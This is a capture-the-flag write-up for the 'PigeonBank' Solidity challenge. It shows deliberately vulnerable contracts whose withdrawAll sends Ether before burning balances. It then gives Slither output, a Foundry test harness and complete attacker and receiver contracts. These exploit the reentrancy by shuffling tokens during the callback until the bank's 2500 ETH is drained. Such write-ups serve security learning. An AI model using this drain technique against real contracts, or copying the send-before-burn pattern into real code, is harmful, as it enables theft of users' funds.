# PigeonBank

## Challenge
We are provided with 2 contracts:

PigeonBank.sol
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";

import "./PETH.sol";

// Deposit Ether to PigeonBank to get PETH
// @TODO: Implement interest rate feature so that users can get interest by depositing Ether
contract PigeonBank is ReentrancyGuard {
    using Address for address payable;
    using Address for address;

    PETH public immutable peth; // @dev - Created by the SEE team. Pigeon Bank is created to allow citizens to deposit Ether and get SEETH and earn interest to survive the economic crisis.
    address private _owner;

    constructor() {
        peth = new PETH();
        _owner = msg.sender;
    }

    function deposit() public payable nonReentrant {
        peth.deposit{value: msg.value}(msg.sender);
    }

    function withdraw(uint256 wad) public nonReentrant {
        peth.withdraw(msg.sender, wad);
    }

    function withdrawAll() public nonReentrant {
        peth.withdrawAll(msg.sender);
    }

    function flashLoan(address receiver, bytes calldata data, uint256 wad) public nonReentrant {
        peth.flashLoan(receiver, wad, data);
    }

    receive() external payable {}
}
```

and PETH.sol
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract PETH is Ownable {
    using Address for address;
    using Address for address payable;

    string public constant name = "Pigeon ETH";
    string public constant symbol = "PETH";
    uint8 public constant decimals = 18;

    event Approval(address indexed src, address indexed dst, uint256 amt);
    event Transfer(address indexed src, address indexed dst, uint256 amt);
    event Deposit(address indexed dst, uint256 amt);
    event Withdrawal(address indexed src, uint256 amt);

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    receive() external payable {
        revert("PETH: Do not send ETH directly");
    }

    function deposit(address _userAddress) public payable onlyOwner {
        _mint(_userAddress, msg.value);
        emit Deposit(_userAddress, msg.value);
        // return msg.value;
    }

    function withdraw(address _userAddress, uint256 _wad) public onlyOwner {
        payable(_userAddress).sendValue(_wad);
        _burn(_userAddress, _wad);
        // require(success, "SEETH: withdraw failed");
        emit Withdrawal(_userAddress, _wad);
    }

    function withdrawAll(address _userAddress) public onlyOwner {
        payable(_userAddress).sendValue(balanceOf[_userAddress]);
        _burnAll(_userAddress);
        // require(success, "SEETH: withdraw failed");
        emit Withdrawal(_userAddress, balanceOf[_userAddress]);
    }

    function totalSupply() public view returns (uint256) {
        return address(this).balance;
    }

    function approve(address guy, uint256 wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function transfer(address dst, uint256 wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    function transferFrom(address src, address dst, uint256 wad) public returns (bool) {
        require(balanceOf[src] >= wad);

        if (src != msg.sender && allowance[src][msg.sender] != type(uint256).max) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        balanceOf[src] -= wad;
        balanceOf[dst] += wad;

        emit Transfer(src, dst, wad);

        return true;
    }

    function flashLoan(address _userAddress, uint256 _wad, bytes calldata data) public onlyOwner {
        require(_wad <= address(this).balance, "PETH: wad exceeds balance");
        require(Address.isContract(_userAddress), "PETH: Borrower must be a contract");

        uint256 userBalanceBefore = address(this).balance;

        // @dev Send Ether to borrower (Borrower must implement receive() function)
        Address.functionCallWithValue(_userAddress, data, _wad);

        uint256 userBalanceAfter = address(this).balance;

        require(userBalanceAfter >= userBalanceBefore, "PETH: You did not return my Ether!");

        // @dev if user gave me more Ether, refund it
        if (userBalanceAfter > userBalanceBefore) {
            uint256 refund = userBalanceAfter - userBalanceBefore;
            payable(_userAddress).sendValue(refund);
        }
    }

    // ========== INTERNAL FUNCTION ==========

    function _mint(address dst, uint256 wad) internal {
        balanceOf[dst] += wad;
    }

    function _burn(address src, uint256 wad) internal {
        require(balanceOf[src] >= wad);
        balanceOf[src] -= wad;
    }

    function _burnAll(address _userAddress) internal {
        _burn(_userAddress, balanceOf[_userAddress]);
    }
}
```

If we look at the Setup we can see that the deployer deposits 2500ether into the bank. If we look at the isSolved() function we can also see that our goal is to get these 2500 eth and reduce the PETH contracts balance to 0.

## Solution

I wanted to play around with [Slither](https://github.com/crytic/slither) a bit so idecided on using it to do a basic analysis of the contract. Interestingly it yielded me 2 vulnerbailities related to the files. I cut off a lot here as it somehow also decided to analyze the whole foundry library...

```bash
Reentrancy in PETH.withdrawAll(address) (src/PETH.sol#40-45):
        External calls:
        - address(_userAddress).sendValue(balanceOf[_userAddress]) (src/PETH.sol#41)
        State variables written after the call(s):
        - _burnAll(_userAddress) (src/PETH.sol#42)
                - balanceOf[src] -= wad (src/PETH.sol#105)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities-1
```

and 

```bash
PETH.flashLoan(address,uint256,bytes) (src/PETH.sol#77-95) ignores return value by Address.functionCallWithValue(_userAddress,data,_wad) (src/PETH.sol#84)
```

To me the first one (reentrancy) looked more promising. It means, that if we would be able to call the withdrawAll() function we could use the reentrancy vulnerability to fully drain the account. Unfortunately this function is protected by the onlyOwner modifier. As the Bank is the owner of PETH and it's only function that leads to withdrawAll() is protected using a reentrancy guard, we would need an additional puzzle piece to exploit this.

My next step was to use my [ParadigmCTFDebugTemplate](https://github.com/J4X-98/SolidityCTFToolkit/blob/main/forge/paradigmTester.sol) to be able to more easily debug. I just added the code accordingly and started to debug.

```solidity
// Description:
// A forge testcase which you can use to easily debug challenges that were built using the Paradigm CTF framework.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "forge-std/Test.sol";
//Import all needed contracts here (they are usually stored in /src in your foundry directory)
import "../src/PETH.sol";
import "../src/PigeonBank.sol";

contract ParadigmTest is Test {
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");

    //Initialize any additional needed variables here
    PigeonBank pigeonBank;
    PETH peth;

    function setUp() public {
	    vm.deal(deployer, 2500 ether);
        vm.startPrank(deployer);

        //Copy all code from the Setup.sol constructor() function into here
        pigeonBank = new PigeonBank();
        peth = pigeonBank.peth();

        // @dev - Deposit 2500 ETH to PigeonBank
        pigeonBank.deposit{value: 2500 ether}();

        vm.stopPrank();
    }

    function test() public {
        //30 eth are the standard for the paradigm framework, but this could be configured differently, you can easily check this by importing the rpc url and private key into metamask and checking the balance of the deployer account
        vm.deal(attacker, 30 ether); 
        vm.startPrank(attacker);

        //Code your solution here

        vm.stopPrank();
        assertEq(isSolved(), true);
    }

    function isSolved() public view returns (bool) {
        //Copy the content of the isSolved() function from the Setup.sol contract here
        return (peth.totalSupply() == 0) && (address(attacker).balance >= 2500 ether);
    }
}
```

After some trying around I realized that I won't be able to exploit the reentrancy in one step. But I can do it with a bit more complicated path:

1. Deposit my eth into the contract
2. Do the following in a loop 250 times (could be done more efficiently but its a CTF so who cares)
3. Call to withdraw all
4. When you receive the money, transfer all your tokens to a different address (under your control)
5. Let the contract burn your balance (0)
6. Transfer the tokens back and start again
7. When the loop has finished you're done.

As I am too lazy to do something 250x I wrote an attack contract that does the work for me.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "./PETH.sol";
import "./PigeonBank.sol";
import "./Receiver.sol";

contract Attacker
{
    PigeonBank public pigeonBank;
    PETH public peth;
    Receiver public receiver;
    address public owner;

    constructor(address _pigeonBankAddress) {
        pigeonBank = PigeonBank(payable(_pigeonBankAddress));
        peth = PETH(pigeonBank.peth());
        owner = msg.sender;
        receiver = new Receiver(_pigeonBankAddress);
    }

    function attack() public payable {
        //First we deposti our 10eth
        pigeonBank.deposit{value: 10 ether}();

        //Now we abuse the bug 250 times to get all the money out of the contract.
        while(address(peth).balance > 0) {
            //Call the withdraw function
            pigeonBank.withdrawAll();

            //Call the giveMyMoneysBack function to get the tokens out of the receiver contract
            receiver.giveMyMoneysBack();
        }

        //Send all the profits to the owner
        owner.call{value: address(this).balance}("");
    }

    receive() external payable {
        //Move the tokens to our receiver contract to not burn them
        peth.transfer(address(receiver), 10 ether);
    }
}
```

I also had to write a receiver contract that returns my tokens:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "./PETH.sol";
import "./PigeonBank.sol";
import "./Receiver.sol";

contract Receiver
{
    PigeonBank public pigeonBank;
    PETH public peth;
    address public attacker;

    constructor(address _pigeonBankAddress) {
        pigeonBank = PigeonBank(payable(_pigeonBankAddress));
        peth = PETH(pigeonBank.peth());
        attacker = msg.sender;
    }

    function giveMyMoneysBack() public {
        peth.transfer(attacker, peth.balanceOf(address(this)));
    }
}
```

After running the contract and calling the attack() function you can retrieve the flag.